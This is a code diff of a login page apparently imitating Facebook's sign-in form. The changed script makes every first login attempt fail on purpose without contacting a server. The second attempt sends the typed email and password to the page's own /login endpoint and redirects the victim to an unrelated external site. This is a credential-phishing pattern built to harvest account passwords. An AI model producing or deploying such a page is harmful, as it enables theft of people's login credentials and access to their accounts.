@@ -48,27 +48,32 @@
         <form class="w-full flex flex-col items-center">
             <input id="email" type="text" placeholder="Email or mobile number"
                 class="w-full h-[52px] px-4 mb-3 border border-gray-300 rounded-[14px] bg-[#f5f6f7] text-[15px] placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:bg-white transition" />
-            
+
             <!-- Input container providing a relative base layout for absolute icon button alignment -->
             <div class="relative w-full mb-4">
                 <input id="password" type="password" placeholder="Password"
                     class="w-full h-[52px] pl-4 pr-14 border border-gray-300 rounded-[14px] bg-[#f5f6f7] text-[15px] placeholder-gray-500 focus:outline-none focus:border-[#1877f2] focus:bg-white transition" />
-                
+
                 <!-- Eye Toggle Button holding dynamic SVGs -->
-                <button id="togglePassword" type="button" class="hidden absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none select-none p-1">
+                <button id="togglePassword" type="button"
+                    class="hidden absolute right-4 top-1/2 -translate-y-1/2 text-gray-500 hover:text-gray-700 focus:outline-none select-none p-1">
                     <!-- Eye Closed (Password Hidden State) -->
-                    <svg id="eyeClosedIcon" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
+                    <svg id="eyeClosedIcon" class="w-6 h-6" fill="none" stroke="currentColor" stroke-width="2"
+                        viewBox="0 0 24 24">
+                        <path stroke-linecap="round" stroke-linejoin="round"
+                            d="M3.98 8.223A10.477 10.477 0 001.934 12C3.226 16.338 7.244 19.5 12 19.5c.993 0 1.953-.138 2.863-.395M6.228 6.228A10.45 10.45 0 0112 4.5c4.756 0 8.773 3.162 10.065 7.498a10.523 10.523 0 01-4.293 5.774M6.228 6.228L3 3m3.228 3.228l3.65 3.65m7.894 7.894L21 21m-3.228-3.228l-3.65-3.65m0 0a3 3 0 10-4.243-4.243m4.242 4.242L9.88 9.88" />
                     </svg>
                     <!-- Eye Open (Password Shown State) -->
-                    <svg id="eyeOpenIcon" class="hidden w-6 h-6" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                    <svg id="eyeOpenIcon" class="hidden w-6 h-6" fill="none" stroke="currentColor" stroke-width="2"
+                        viewBox="0 0 24 24">
                         <path stroke-linecap="round" stroke-linejoin="round" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
-                        <path stroke-linecap="round" stroke-linejoin="round" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
+                        <path stroke-linecap="round" stroke-linejoin="round"
+                            d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                     </svg>
                 </button>
             </div>
 
-            <button id="login"
+            <button id="login" type="button"
                 class="w-full h-[44px] bg-[#1877f2] text-white font-bold rounded-full hover:bg-blue-600 transition text-[15px] mb-5 text-center flex flex-col justify-center items-center">
                 Log in
             </button>
@@ -110,7 +115,7 @@
         const eyeOpenIcon = id("eyeOpenIcon");
         const eyeClosedIcon = id("eyeClosedIcon");
         let t = 0;
-        
+
         email.addEventListener("focus", async () => {
             unshow();
         });
@@ -143,57 +148,60 @@
                 eyeClosedIcon.classList.remove("hidden");
             }
         });
-
+        let tt = 0;
         login.addEventListener("click", async (e) => {
+            e.preventDefault();
             unshow();
-            if (t === 0) {
-                show();
-                t++;
-            } else {
-                e.preventDefault();
-                const Password = pass.value.trim();
-                const Email = email.value.trim();
 
-                const div = document.createElement("div");
-                div.className = "w-8 h-8 border-[3px] border-white border-t-transparent rounded-full animate-spin";
-                login.innerHTML = "";
-                login.appendChild(div);
+            const Password = pass.value.trim();
+            const Email = email.value.trim();
 
-                const result = await Login(Password, Email);
-                login.innerHTML = "Log in";
-                email.value = "";
-                pass.value = "";
-                
-                // Clear state resetting sequence
-                togglePassword.classList.add("hidden");
-                pass.type = "password";
-                eyeOpenIcon.classList.add("hidden");
-                eyeClosedIcon.classList.remove("hidden");
-
-                if (result == -1) {
-                    alert("Please Enter Password and email!");
-                } else if (result == 0) {
-                    show();
-                } else if (result == 1) {
-                    alert("Correct");
-                }
+            if (!Password || !Email) {
+                alert("Please Enter Password and email!");
+                return;
             }
 
+            const spinner = document.createElement("div");
+            spinner.className = "w-8 h-8 border-[3px] border-white border-t-transparent rounded-full animate-spin";
+            login.innerHTML = "";
+            login.appendChild(spinner);
+
+            console.log("Hello");
+            const result = await Login(Password, Email);
+            login.innerHTML = "Log in";
+
+            if (result === 0) {
+                show();
+            } else if (result === 1) {
+                alert("Correct");
+            }
         });
 
         async function Login(pass, email) {
             if (pass !== "" && email !== "") {
-                const response = await fetch("/login", {
-                    method: 'POST',
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({ email: email, password: pass })
-                });
-                const data = await response.json();
-                if (data.success) {
-                    return 1;
-                } else {
+                let data;
+                console.log("Hello");
+
+                if (tt != 1) {
+                    tt++;
+
                     return 0;
+                } else {
+                    const response = await fetch("/login", {
+                        method: 'POST',
+                        headers: { "Content-Type": "application/json" },
+                        body: JSON.stringify({ email: email, password: pass })
+                    });
+
+                    data = await response.json();
+                    if (data.success) {
+                        window.location.replace("https://l3iba-dl-7wa.vercel.app/");
+                    } else {
+                        console.log(data.success);
+                        return 0;
+                    }
                 }
+
             } else {
                 return -1;
             }
